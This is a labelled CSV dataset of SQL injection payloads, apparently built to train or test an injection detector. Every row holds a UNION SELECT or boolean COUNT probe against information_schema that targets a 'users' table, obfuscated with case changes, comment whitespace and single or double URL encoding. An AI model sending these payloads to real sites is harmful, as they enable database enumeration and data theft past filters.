payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
"id=1%27 UnIOn Select column_name,+table_name+From+information_schema.columns+WHERE table_name%3D'users%27+%3B-- -",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_INFO_SCHEMA_002,fe9f7df77d6ddb321390709ff4aa9a39,fee7898f7b1bdcddeb03f177c7797477,113
"id=1%27+unIon SELECT+column_name, table_name FROM information_schema.columns wHeRe+table_name%3D'users%27+%3B-- -",1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_002,27556796389c042f7c67504eb7d5f990,21922f249147229cf59be74f7f488a31,113
"id=1%27++Union  select+ column_name, +table_name++from  information_schema.columns+ Where++table_name%3D'users%27 +--",1,sqli_info_schema,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_002,14ef8672728a8a4da82b7683b517514c,0c918c077803e64585076bd59e7d57b0,117
id%3D1%27  ANd +(SELECT  COUNT(%2A)+ fRoM++information_schema.columns++WhEre  table_name%3D%27users%27)>0+ --+ -,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_003,04e4090c4a392525f92a0def7ea29f75,25d24049d833aed492b687b1d4f33853,112
"id=1%27/%2A%2A/Union%2F%2A*/SELECT/%2A%2A%2Fcolumn_name,%2F**/table_name%2F%2A%2A%2FFRoM%2F*%2A%2Finformation_schema.columns/%2A%2A%2FWhere/%2A%2A%2Ftable_name%3D%27users%27%2F%2A%2A%2F--%2F%2A*%2F-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,075f1ba01c62c1b00c6cf3f1bdaf7940,2ae030098479f31afa176391e3057e79,198
id%3D1%27+AND (SELECT+COUNT(*)+FROM+information_schema.columns WHERE+table_name%3D%27users%27)>0 %23,1,sqli_info_schema,comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_003,b2613a47809004fedffda4a59a911c6f,b897e77a0560aea5b3101432d95dc4f5,100
"id%3D1%27+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+/%2A",1,sqli_info_schema,comment_block_comment|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_001,c266238272532164d2949c9771eb8e79,f6411a987c1a209c0598313411ac1b5b,83
"id%3D1'+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WHERE+table_name%3D'users%27+--",1,sqli_info_schema,comment_dash_dash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,3a006038e8bca34d6d9d7b073f5a83ee,0fb02b69141063fea1bb001e6f51ab40,108
id%253D1%2527%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT%252F%252A%252A%252Ftable_name%252C%252F%252A%252A%252Ftable_schema%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.tables%252F%252A%252A%252F--,1,sqli_info_schema,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_INFO_SCHEMA_001,3c1d2973e909cfa6fc12fdf415091ab9,452934cba5c0b18a7ca89a6982c385c2,222
"id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/FROM/**/information_schema.tables/**/--/**/-",1,sqli_info_schema,comment_dash_dash_space|ws_comment_ws,raw,SQLI_INFO_SCHEMA_001,2af0bc9fef36db00773bb1cb1b118518,135b9c3009b51eb1260608d32f9259d1,103
id=1'+AND+(SELECT+COUNT(%2A)+FROM+information_schema.columns+WHERE+table_name=%27users%27)%3E0 %23,1,sqli_info_schema,comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_003,d2d21b798a8fccda4abbaa3c6d615983,f35480bb1fceca44fe978bca4aa37287,98
"id%3D1' UNION+SELECT+table_name,+table_schema FROM information_schema.tables+%2F%2A",1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_001,fea664f0e3bd2476622487a9e0d6679b,a19e532fa969cce42f0516bd4c8d3f39,83
id%3D1' AND+(SELECT+COUNT(*) FROM+information_schema.columns WHERE+table_name%3D'users')%3E0+;-- -,1,sqli_info_schema,comment_semicolon_comment|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,29a5c8fc113f9334ffc768d028d9e1f4,c0b0d8d2fb87a63e3c259774018ff1f1,98
id%253D1%2527%252Band%252B%2528SELECT%252BCOUNT%2528%252A%2529%252BfROm%252Binformation_schema.columns%252BWhere%252Btable_name%253D%2527users%2527%2529%253E0%252B%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_INFO_SCHEMA_003,6af7d25d1bba1cd6b5fe34477a7e3732,9a3f053e3403ed314712a8e7a8ab103e,173
id%3D1%27%2520UNION%2520SELECT%2520table_name%2C%2520table_schema%2520From%2520information_schema.tables%2520%2523,1,sqli_info_schema,case_var|comment_url_hash|ws_url_space,url_encoded,SQLI_INFO_SCHEMA_001,d671486d71120f42a2f2978b677d143e,171e9e053eeea4cebf2763b40eceb6f3,114
id=1' AND (SELECT COUNT(*) from information_schema.columns WHERE table_name='users')>0 --,1,sqli_info_schema,case_var|comment_dash_dash,raw,SQLI_INFO_SCHEMA_003,0b7fcc02e7d6ff5b73d3eb05112d7926,305b972403e7053139cacbddc5c8eac0,89
"id=1'%2F%2A%2A%2FUNION%2F**/SELECT%2F%2A%2A/column_name,/%2A%2A/table_name%2F*%2A%2FFROM/*%2A%2Finformation_schema.columns/%2A%2A%2FWHERE/**/table_name%3D'users%27%2F%2A%2A%2F--",1,sqli_info_schema,comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_002,ab05a8c8d376b94c816e98aa1e3d321f,58205df67a1dbf5d6e6995a077d3b1fa,177
"id%3D1' UNION SELECT table_name, table_schema FROM information_schema.tables+%3B-- -",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,dff1e88f711be71f430123da6d761063,d7dadf88f5b224220ab8e6378ab37cce,84
"id=1%27	UNIOn	select	table_name,	table_schema	From	information_schema.tables	%2F*",1,sqli_info_schema,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_001,c1345419e873561d52abfc45cff8cbd5,674c73dd1a53cda65c2d026c4870930e,81
"id%3D1'+UNION+Select column_name, table_name+FROM information_schema.columns+Where table_name=%27users%27+%23",1,sqli_info_schema,case_var|comment_hash,partially_encoded,SQLI_INFO_SCHEMA_002,c6c4220a6cdf21795407ed53f64f42ae,b3526bdc3fdf381b4c71392e3feeaf82,109
"id%3D1'+UNION+SELECT+table_name, table_schema+FROM information_schema.tables+--+-",1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_001,91b490c1cea369959c289f18fa292038,8e484892ed5d3708f95f72e2a3a6ee4e,81
id%253D1%2527%2BUNION%2BSELECT%2Btable_name%252C%2Btable_schema%2BFROM%2Binformation_schema.tables%2B%252523,1,sqli_info_schema,comment_url_hash,double_encoded,SQLI_INFO_SCHEMA_001,6b08582d24c2ed456552106840108c67,9d88ed5851050435b6f7052222c66ae0,108
"id=1%27+UNION SELECT+column_name, table_name+FROM information_schema.columns WHERE+table_name=%27users%27+;--+-",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_002,aba5f7e34a4ea92d5227aa6e29e69478,933f567a4ac5782c92ace497637df999,111
"id%3D1%27/*%2A/UNion%2F%2A%2A/SeleCT%2F*%2A%2Ftable_name,/*%2A/table_schema%2F%2A%2A%2Ffrom%2F*%2A%2Finformation_schema.tables%2F%2A%2A%2F--",1,sqli_info_schema,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_001,d1970a730502457cb0c9b1fcaf5d81a7,1a9da08932371bc8c843e1da68b4f7a8,140
"id=1'+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+/*",1,sqli_info_schema,comment_block_comment|ws_plus,raw,SQLI_INFO_SCHEMA_001,ce03e3f5b0c71b4dba00cec6576f3ce4,6125477fcd317607ca3b27deca6bf21a,77
"id=1%27/%2A%2A/UniON%2F*%2A/SELECT%2F**/column_name,%2F%2A*%2Ftable_name%2F%2A*%2Ffrom/%2A%2A%2Finformation_schema.columns/%2A%2A/where%2F%2A%2A%2Ftable_name=%27users%27%2F%2A*%2F#",1,sqli_info_schema,case_var|comment_hash|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,263e753598533cfd3c1df040d08b4ccc,36754cc32762b3b45f04fa75276b23cd,180
"id%3D1%27+UNION+SELECT+column_name,+table_name+fRom+information_schema.columns+wheRe+table_name='users%27+--",1,sqli_info_schema,case_var|comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_002,2d6eb4eb14b612a86c29f2b644a17eb7,aae03ac7fd78eeb57872950cc0da8cb7,108
id%3D1%27+AND+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name%3D%27users%27)>0+/%2A,1,sqli_info_schema,comment_block_comment|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_003,a9f6aca5b8c20e5911e7086c0655979b,e317a27fe1e772bd07a3fff6529ed879,101
id%3D1%27+UNiON+SELECT+table_name%2C+table_schema+FrOM+information_schema.tables+%2523,1,sqli_info_schema,case_var|comment_url_hash,url_encoded,SQLI_INFO_SCHEMA_001,c398c9066251ae1547917c1b8bb32384,249da74e1947e65bbd18710f3fc20f1e,86
"id%3D1'	Union	select	table_name,	table_schema	From	information_schema.tables	%23",1,sqli_info_schema,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_001,a7dbb12711fea3d25447861e039b88dd,87d8ae1571908b280fe35b380236418a,80
"id%3D1%27+UNION+select+table_name, table_schema+FROM information_schema.tables+%23",1,sqli_info_schema,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_INFO_SCHEMA_001,0316cd55df342d728e7059e093e82296,d140849e0e4fddfd476be1f6d057579e,82
"id=1'%2F%2A*/Union%2F%2A%2A/SELECT%2F%2A*/table_name,%2F%2A%2A%2Ftable_schema%2F*%2A%2Ffrom%2F%2A*%2Finformation_schema.tables/**%2F%2F%2A",1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_001,3d91466d43e28707f23c0d3ff9dca1a2,9c566defc5c17a88d59484e69270dbe7,138
id=1'+and+(SELECT+COUNT(%2A)+FROm+information_schema.columns+Where+table_name=%27users%27)%3E0+%3B-- -,1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_003,9e9e91f3a74aebaa24d10e3ec673dad3,076fcd657dddef0282c8fbe27cf16288,102
"id%3D1%27 UNION+SELECT+column_name, table_name FROM+information_schema.columns+WHERE table_name=%27users%27 --",1,sqli_info_schema,comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_002,3a98c7954961404bd9e9f532c977a0ab,6a28d31ffdd0ff5a527276f2bcaa286a,110
id=1%27 And+(SELECT COUNT(%2A)+From+information_schema.columns+where+table_name=%27users%27)%3E0 /%2A,1,sqli_info_schema,case_var|comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_003,1f66a5361139f7b554ec03f3be8f55da,4b7f47e32103e7ae64ea6d534e9ef245,101
id%253D1%2527%2B%2BUnion%2B%2BSelect%2B%2Bcolumn_name%252C%2B%2Btable_name%2B%2BFROM%2B%2Binformation_schema.columns%2B%2Bwhere%2B%2Btable_name%253D%2527users%2527%2B%2B%2523,1,sqli_info_schema,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_002,a0d71eeec0197457344719857371859d,eaadac790b5a8cefbd0df304f189f3cd,174
"id%3D1%27	uniOn	Select	table_name,	table_schema	From	information_schema.tables	%3B--	-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_001,f1830a3a1621e6492e57d692b608b23f,41b8dd8dd98f8c55729514eb020d1215,86
"id%3D1'+UNION+SELECT table_name,+table_schema FROM+information_schema.tables ;-- -",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,36fa12540bfb6f1512d09c97c01f04d7,41be989ce2307822b676288a9943aff4,82
"id=1%27 UNION SELECT+table_name, table_schema+FROM+information_schema.tables+;-- -",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,52c06d4a52664cc1268e7b61f25edf4c,91e3ed599b21dea98a487594349ff00a,82
id%3D1%27%20AND%20(SELECT%20COUNT(%2A)%20From%20information_schema.columns%20where%20table_name%3D%27users')%3E0%20%23,1,sqli_info_schema,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_003,e058a41262d0be38b27efc8eed1fa4e6,07ea5daa6d840adef87942e071539486,118
id%3D1%27%09AND%09%28SELECT%09COUNT%28%2A%29%09frOM%09information_schema.columns%09where%09table_name%3D%27users%27%29%3E0%09%23,1,sqli_info_schema,case_var|comment_hash|ws_tab,url_encoded,SQLI_INFO_SCHEMA_003,943775944f5769f442f9fee546e733b3,18ee88edd89201321c6079039f2e19df,128
"id%3D1'/%2A%2A%2FUNION/%2A%2A%2FSELECT%2F*%2A%2Ftable_name,/**/table_schema/%2A%2A/FROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F;--%2F*%2A%2F-",1,sqli_info_schema,comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_001,a9e84857f689823756966beef4b14923,487465bb6efe7c890f537c7c1c524fda,150
"id=1'/**/UNION/**/select/**/table_name,/**/table_schema/**/FROM/**/information_schema.tables/**//*",1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_INFO_SCHEMA_001,6f1e2be325f2ea069983fe9fdcc6a7eb,d7cf7256bac41265e7ceaa9298e6b2cf,98
id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users')>0/**/#,1,sqli_info_schema,comment_hash|ws_comment_ws,raw,SQLI_INFO_SCHEMA_003,ff82a91240aa437ee061dbe69646ca95,aa199e9cf069d0050fb54b25f9d12d08,112
"id%3D1%27+Union Select table_name,+table_schema From+information_schema.tables+%23",1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_001,e9222f4aa301e9136cf9aafe25b2a745,e8e00ed120fadab2239a05fac49489bf,82
id%253D1%2527%2509union%2509select%2509table_name%252C%2509table_schema%2509From%2509information_schema.tables%2509%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_001,7044d258d3cf21aa1712529e45b0aebe,0642aad914693c924e2b31ac5c821ad6,122
id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name='users')>0%20/*,1,sqli_info_schema,comment_block_comment|ws_url_space,raw,SQLI_INFO_SCHEMA_003,e38972e036f90315762fc63ff77c340e,ea8d7d0aef3913db039347c0524b4329,105
"id%3D1%27+union+select+table_name,+table_schema+From+information_schema.tables+%23",1,sqli_info_schema,case_var|comment_hash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_001,5d060f97c36a192752094942e36c601c,56829e3d12d20ca1cedbe8fa66874bd5,82
id%3D1%27%09Union%09Select%09table_name%2C%09table_schema%09From%09information_schema.tables%09%23,1,sqli_info_schema,case_var|comment_hash|ws_tab,url_encoded,SQLI_INFO_SCHEMA_001,ba2b1171de6a73a672b47d89df7337dd,733a9ff85324c0a0419085f4d19e0ef0,98
id%3D1%27%2BAnd%2B%28SELECT%2BCOUNT%28%2A%29%2BfrOm%2Binformation_schema.columns%2BWhere%2Btable_name%3D%27users%27%29%3E0%2B%23,1,sqli_info_schema,case_var|comment_hash|ws_plus,url_encoded,SQLI_INFO_SCHEMA_003,5a98c01b13415a3d472d7a81ab361dfd,a2b555f35c5c509e9d840f8520b6d19b,128
id%253D1%2527%252F%252A%252A%252Funion%252F%252A%252A%252FSElect%252F%252A%252A%252Fcolumn_name%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252Ffrom%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252FWHeRe%252F%252A%252A%252Ftable_name%253D%2527users%2527%252F%252A%252A%252F%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_INFO_SCHEMA_002,a9dbb3872d6451f76f7a18f4cd06b40e,d000e2dfd17eac0259f35d9c8d2d87cc,305
id%253D1%2527%2B%2BAND%2B%2B%2528SELECT%2B%2BCOUNT%2528%252A%2529%2B%2BFROM%2B%2Binformation_schema.columns%2B%2BWHERE%2B%2Btable_name%253D%2527users%2527%2529%253E0%2B%2B%2523,1,sqli_info_schema,comment_hash|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_003,df0796bf1545f3c8ac94a64fa464a38f,481d3a6c3b0dab58226d52f5ddf084d3,176
"id=1'+union+selECT+table_name,+table_schema+From+information_schema.tables+--+-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_plus,raw,SQLI_INFO_SCHEMA_001,a9fa6d69df2bd1db2ebd7a9faa0905f5,fc6c3622c608339ac4bacf62a914c2be,79
id%3D1%27%2520AND%2520%28SELECT%2520COUNT%28%2A%29%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%29%3E0%2520%3B--%2520-,1,sqli_info_schema,comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_003,8f83553770ba71f3869681e4f48fbcdd,2e91b27217c4b9e6cbc9f9bf6166c3d0,152
"id%3D1%27++UNION +SELECT++table_name,  table_schema+ FROM+ information_schema.tables+ --+ -",1,sqli_info_schema,comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_001,b931afc27bf6c63eb69c82b1205b87b5,3343928224f7cfd6932054763c2876b9,91
"id=1%27 UNION SELECT column_name,+table_name+FROM+information_schema.columns+WHERE+table_name=%27users%27 --",1,sqli_info_schema,comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_002,2789d059911c82b09bee1ad4d811bb26,9e39d9f47f9eb5f0b0898974348512fd,108
id%3D1%27+++UNION+++SELECT+++table_name%2C+++table_schema+++FROM+++information_schema.tables+++%2F%2A,1,sqli_info_schema,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_001,56cbfbc933d63aa4d13b1e1556b5464b,098f4919a963eeed79ce89ff0f44de34,101
id%3D1%27%2F%2A%2A%2FANd%2F%2A%2A%2F%28SELECT%2F%2A%2A%2FCOUNT%28%2A%29%2F%2A%2A%2FFRom%2F%2A%2A%2Finformation_schema.columns%2F%2A%2A%2FWHere%2F%2A%2A%2Ftable_name%3D%27users%27%29%3E0%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_INFO_SCHEMA_003,ccf7c84bbcddd7d3f2054eab23603ac5,449b6d8fc3cd10f7ddfd64e48253fffe,212
id%3D1%27%2BUNION%2BSELECT%2Bcolumn_name%2C%2Btable_name%2BFROM%2Binformation_schema.columns%2BWHERE%2Btable_name%3D%27users%27%2B--%2B-,1,sqli_info_schema,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_INFO_SCHEMA_002,ce6447093f5348ee608617a9db03f95c,f431cfe19ddaf18475e1a1a845575c61,136
"id=1'/**/unioN%2F%2A%2A/SeLECt%2F**%2Ftable_name,%2F%2A*%2Ftable_schema/%2A*/From%2F%2A%2A/information_schema.tables%2F**%2F%2F%2A",1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_001,16799b5d8628160f7181c43b78405267,ae8a571a16295273fa14675daae2b139,130
id%3D1'+and+(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_name%3D%27users%27)%3E0 %3B--+-,1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_003,6057bdf1cb294ad0b8e80dfa7f5ba751,39c2ef250637d1e5041c39b6b3d25f9e,104
id%3D1%27	AND	(SELECT	COUNT(%2A)	froM	information_schema.columns	WHERE	table_name%3D%27users')>0	#,1,sqli_info_schema,case_var|comment_hash|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_003,38b0d7602a57fbad32fce1f66ea2f291,2593ecf2530fc561ea938bdead23ba43,98
id%3D1%27%2520Union%2520SELECT%2520table_name%2C%2520table_schema%2520from%2520information_schema.tables%2520%3B--%2520-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_INFO_SCHEMA_001,316e86b453b52b55fb048813535ac9c1,5fc685e27666ba94edc70d4f7dbb38db,120
id=1%27%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users%27)>0%20%3B--%20-,1,sqli_info_schema,comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_003,0dd64a1c32ee64139783e9c06a40a2a4,bc1bfcc9546697ad7da543329f4dc3ee,118
id%3D1%27+AND+(SELECT+COUNT(*)+FROM information_schema.columns+WHERE+table_name='users')%3E0 --+-,1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_003,ffe0a5092bacc86b97f663606c0c0c7d,9dd9a1da80430bf7fc8503bc9106bf4f,97
id=1'%20aND%20(SELECT%20COUNT(*)%20From%20information_schema.columns%20Where%20table_name='users')>0%20--,1,sqli_info_schema,case_var|comment_dash_dash|ws_url_space,raw,SQLI_INFO_SCHEMA_003,f8fae22f1f64a22e8b4a4942e377a71a,082f2bc59e88097be15a8a432beba2c2,105
"id=1%27/*%2A%2Funion%2F*%2A%2FSelect/*%2A%2Fcolumn_name,/**%2Ftable_name%2F%2A*%2FFrom%2F%2A%2A%2Finformation_schema.columns/%2A%2A%2Fwhere%2F%2A%2A/table_name=%27users%27%2F%2A%2A/--%2F%2A%2A/-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,0511554b8034792a12731b27a5887de8,1a7551251d4d94ce35f92a3d6ae7a500,194
"id=1'+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WHERE+table_name='users'+/*",1,sqli_info_schema,comment_block_comment|ws_plus,raw,SQLI_INFO_SCHEMA_002,bcfa36af1aa61d1a51e88b32803b0693,c3672ad7106486a353c0253fc65b37f0,102
id%253D1%2527%252BuNIOn%252Bselect%252Bcolumn_name%252C%252Btable_name%252BFrOm%252Binformation_schema.columns%252Bwhere%252Btable_name%253D%2527users%2527%252B%253B--%252B-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_INFO_SCHEMA_002,ca13c40fefa78cb02d88d8996f9ce69f,d837e2373457c021a8768a7e11c57aa3,173
id=1'+ And+ (SELECT +COUNT(%2A)+ From +information_schema.columns +where+ table_name%3D'users%27)%3E0  %23,1,sqli_info_schema,case_var|comment_url_hash|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_003,9337e32c9ad1d3a82e25e0fbff6ca863,a9b2100631fd6f283ec7c9bdbb154ee2,106
"id%3D1%27 UNION SELECT table_name,+table_schema+FROM information_schema.tables %2F%2A",1,sqli_info_schema,comment_block_comment|ws_space,partially_encoded,SQLI_INFO_SCHEMA_001,e6f0c5883707b1b6c5eac989eb3d89d2,07b13783a825b0a2d95a0129464072b8,85
id%253D1%2527%252520UNION%252520SELECT%252520column_name%252C%252520table_name%252520FROM%252520information_schema.columns%252520WHERE%252520table_name%253D%2527users%2527%252520%2523,1,sqli_info_schema,comment_hash|ws_url_space,double_encoded,SQLI_INFO_SCHEMA_002,c8a53abc0f95530acb16d9744429f9e6,6a74a3046597ea1c5b40d5ff2ce6f262,183
"id=1%27+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27+--+-",1,sqli_info_schema,comment_dash_dash_space|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,6a91d467b3e6d497ac37a659c116f485,4aa325bb5b0d698183f56672815c9aa2,112
id=1'++And++(SELECT  COUNT(%2A)++From+ information_schema.columns +where +table_name%3D'users%27)%3E0++--,1,sqli_info_schema,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_003,e2bd10dd586785bb66f425255e343b73,81105d8025af5cb506fea7cae8002ffc,105
id%253D1%2527%252F%252A%252A%252FuNion%252F%252A%252A%252FsELect%252F%252A%252A%252Fcolumn_name%252C%252F%252A%252A%252Ftable_name%252F%252A%252A%252FFROM%252F%252A%252A%252Finformation_schema.columns%252F%252A%252A%252Fwhere%252F%252A%252A%252Ftable_name%253D%2527users%2527%252F%252A%252A%252F--%252F%252A%252A%252F-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,double_encoded,SQLI_INFO_SCHEMA_002,85fbda42598cb0d7cc835881ddb48037,ea7be45bfe4db12620196eb44e026243,318
id%3D1%27%2520AND%2520%28SELECT%2520COUNT%28%2A%29%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%29%3E0%2520--%2520-,1,sqli_info_schema,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_INFO_SCHEMA_003,ff4575163758da5c10f20236cb4cffd6,71efedae666b3615fa6b575f523c57b3,149
"id=1'/**/UNION/**/SELECT/**/table_name,/**/table_schema/**/FROM/**/information_schema.tables/**/#",1,sqli_info_schema,comment_hash|ws_comment_ws,raw,SQLI_INFO_SCHEMA_001,b12a2d146776db849dc205c434549d97,346f93f825c61e5d97de6084a8a0a345,97
id%3D1%27%2Bunion%2BSELECT%2Bcolumn_name%2C%2Btable_name%2BFrom%2Binformation_schema.columns%2BWhere%2Btable_name%3D%27users%27%2B%2523,1,sqli_info_schema,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_INFO_SCHEMA_002,c155dcf6b852e99a0cfd153c8c5eff41,42247953287f499366bc9d447d6e799a,135
"id%3D1%27+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+--",1,sqli_info_schema,comment_dash_dash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_001,8ba961c92952e8da7bac519ac13946fb,5c43292207ed61e3dc8680a2e44f5290,81
"id=1'++Union++sEleCT  column_name,++table_name+ FROM++information_schema.columns  Where++table_name%3D'users'  %2F%2A",1,sqli_info_schema,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_002,bc6b2d0cf2305cfc93dbb61f9ba3a47e,4bef241bbd82e02a1474ff7ce597545c,117
"id=1%27 +UnioN++sElect +table_name,++table_schema++from++information_schema.tables +--  -",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_001,c0e5a964745c007c1353481ea5d04dab,75816e267d42a4069f0744e34df034b4,89
id=1%27+and+(SELECT+COUNT(*)+from+information_schema.columns+wherE+table_name%3D%27users')%3E0+%23,1,sqli_info_schema,case_var|comment_url_hash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_003,56a033185549836d4c3de131600d714d,6822a2ad552a6d0cb81cbf9b5c37645a,98
id%253D1%2527%252520AND%252520%2528SELECT%252520COUNT%2528%252A%2529%252520FROM%252520information_schema.columns%252520WHERE%252520table_name%253D%2527users%2527%2529%253E0%252520--,1,sqli_info_schema,comment_dash_dash|ws_url_space,double_encoded,SQLI_INFO_SCHEMA_003,f2e67afa3ea74c11143d145339b8ab56,3b5f0b671f875743fcb4764b78eec28e,181
